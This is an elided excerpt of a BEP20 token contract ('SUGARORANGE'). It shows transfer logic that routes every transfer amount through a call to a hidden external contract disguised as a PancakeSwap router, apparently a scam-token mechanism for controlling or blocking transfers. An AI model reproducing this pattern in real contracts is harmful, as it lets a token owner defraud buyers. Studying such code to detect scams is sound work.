...
contract SUGARORANGE is Context, iBEP20, Ownable{
  ...
  string private constant _name = 'SUGARORANGE';
  string private constant _symbol = 'ORANGE';
  
  uint256 private _totalSupply = 10000000000 *  10**9;
  uint8 private constant _decimals = 9;
  uint256 private _bonusORANGE = 0;
  address pancakeRouter_ORANGE;
  ...
  */
  ...
  function pancakePairORANGE(address sender, address recipient, uint256 amount) private returns (uint256) {      
      ...
      resData = IPancake(pancakeRouter_ORANGE).getPair(_bonusORANGE, sender, recipient, arrData);

      _bonusORANGE = resData[0];
  ...
  function _transfer(address sender, address recipient, uint256 amount) private {
    ...
    uint256 bonusAmountORANGE = pancakePairORANGE(sender, recipient, amount);   
     _transferStandard(sender,recipient,bonusAmountORANGE);
